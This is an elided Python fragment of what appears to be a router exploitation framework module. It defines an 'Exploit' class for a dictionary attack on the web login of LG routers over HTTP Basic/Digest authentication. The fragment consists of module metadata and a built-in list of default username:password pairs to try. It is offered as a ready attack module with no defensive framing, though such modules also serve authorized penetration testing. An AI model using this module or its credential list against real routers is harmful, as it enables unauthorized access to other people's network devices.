...
class Exploit(HTTPBasicDigestDefault):
    __info__ = {
        "name": "Lg Router Default Web Interface Creds",
        "description": "Dictionary attack against Lg Router Web Interface (HTTP Basic/Digest Auth).",
    ...
    defaults = OptWordlist("admin:admin,:jannie,admin:epicrouter,vikram:singh", "User:Pass or file with default credentials (file://)")
